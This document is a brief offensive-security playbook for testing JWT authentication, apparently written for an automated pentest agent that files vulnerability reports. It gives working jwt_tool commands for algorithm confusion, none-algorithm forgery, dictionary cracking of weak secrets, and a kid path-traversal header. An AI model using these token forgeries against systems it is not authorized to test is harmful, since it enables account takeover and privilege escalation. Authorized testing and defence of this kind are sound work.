# Offensive Playbook: JWT Authentication & Token Security

## 1. Overview & Attack Surface
JSON Web Tokens (JWT) are widely used for stateless session management and API authorization. Flaws typically arise in signature verification, algorithm confusion, weak secret keys, or improper claims validation.

## 2. Reconnaissance & Token Analysis
1. Intercept HTTP requests via Caido (`list_requests`) and identify `Authorization: Bearer <token>` or session cookies.
2. Decode JWT payload and header:
   ```bash
   jwt_tool <token> -t
   ```
3. Inspect key header fields:
   - `alg`: Signature algorithm (`RS256`, `HS256`, `none`).
   - `jwk` / `jku`: Injected JSON Web Key sets or URLs.
   - `kid`: Key ID parameter (potential SQLi or path traversal vector).

## 3. Exploit Vectors & Dynamic Testing

### A. Algorithm Confusion (RS256 -> HS256)
If the server expects an asymmetric key (RSA public key) but accepts symmetric HMAC (`HS256`), sign the token with the server's public key as the HMAC secret:
```bash
jwt_tool <token> -X k -pk public.pem
```

### B. None Algorithm Attack
Change the header `alg` to `none`, `None`, or `NONE`, and remove the signature component:
```bash
jwt_tool <token> -X a
```

### C. Weak Secret Key Cracking
Attempt offline secret dictionary attack against HMAC-SHA256 tokens:
```bash
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
```

### D. Key ID (`kid`) Path Traversal / SQLi
Test if the `kid` parameter fetches key files from disk:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../dev/null"
}
```
Sign with an empty HMAC secret `""`.

## 4. Verification & Reporting
- Reproduce privilege escalation by accessing an admin endpoint (e.g. `/api/admin/users`).
- Submit finding via `create_vulnerability_report` with CVSS 3.1 vector (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`).
